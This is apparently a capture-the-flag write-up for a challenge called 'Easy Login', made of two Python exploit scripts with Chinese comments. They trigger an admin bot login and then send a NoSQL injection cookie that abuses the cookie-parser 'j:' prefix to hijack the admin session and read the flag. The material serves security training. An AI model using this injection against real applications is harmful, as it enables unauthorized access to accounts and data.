## Easy Login
```python
import requests  
import time  
  
# 请修改为你的题目实际地址  
target = "http://223.6.249.127:24666"  
  
  
def exploit():  
    # 1. 触发机器人登录  
    print("[+] Triggering admin login (Puppeteer)...")  
    try:  
        # 这个请求会阻塞直到后端返回（即机器人启动完成），  
        # 但机器人内部的登录动作是在浏览器里异步进行的。  
        requests.post(f"{target}/visit", json={"url": f"{target}/"}, timeout=20)  
    except Exception as e:  
        print(f"[-] Visit request failed: {e}")  
  
    # 2. 关键：给机器人一点时间完成登录动作 (5-8秒左右)  
    print("[*] Waiting for bot to complete login...")  
    time.sleep(8)  
  
    # 3. 构造 NoSQL 注入 Cookie    # 我们利用 j: 前缀告诉 cookie-parser 将其解析为 JSON 对象  
    # $gt: "" 表示 sid 大于空字符串，这几乎能匹配任何存在的 sid    payload_cookie = 'j:{"$gt": ""}'  
    cookies = {"sid": payload_cookie}  
  
    print(f"[+] Injecting NoSQL with cookie: {payload_cookie}")  
  
    # 4. 访问 admin 接口  
    res = requests.get(f"{target}/admin", cookies=cookies)  
  
    # 调试：打印状态码和返回内容  
    print(f"[*] Status Code: {res.status_code}")  
  
    if res.status_code == 200:  
        try:  
            data = res.json()  
            print(f"[\u2713] Success! Flag: {data.get('flag')}")  
        except:  
            print(f"[-] Response is not JSON: {res.text}")  
    elif res.status_code == 403:  
        print("[-] Access Denied (403): You might be logged in as a non-admin user or bot failed.")  
        # 尝试看看当前是谁  
        me = requests.get(f"{target}/me", cookies=cookies).json()  
        print(f"[*] Currently logged in as: {me.get('username')}")  
    else:  
        print(f"[-] Failed with status {res.status_code}")  
        print(f"[*] Response text: {res.text}")  
  
  
if __name__ == "__main__":  
    exploit()
```
也可以写简略一点
```python
import requests  
  
BASE_URL = 'http://223.6.249.127:33479'  
  
res = requests.post(f"{BASE_URL}/visit", json={"url": "http://example.com"})  
print(res.status_code)  
headers = {  
    'Cookie': 'sid=j:{"$ne":null}'  
}  
res = requests.get(f"{BASE_URL}/admin", headers=headers)  
print(res.json())
```
